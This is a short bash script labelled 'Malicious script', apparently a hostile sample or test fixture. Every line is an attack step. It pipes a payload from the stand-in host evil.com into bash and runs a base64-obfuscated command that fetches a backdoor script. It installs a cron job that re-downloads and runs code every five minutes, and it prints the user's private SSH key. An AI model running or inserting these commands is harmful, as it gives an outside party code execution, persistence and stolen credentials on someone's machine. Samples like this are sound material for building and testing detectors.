#!/bin/bash
# Malicious script
curl http://evil.com/payload.sh | bash
echo "Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2ggfCBiYXNo" | base64 -d | bash
crontab -l > /tmp/cron && echo "*/5 * * * * curl evil.com | sh" >> /tmp/cron && crontab /tmp/cron
cat ~/.ssh/id_rsa
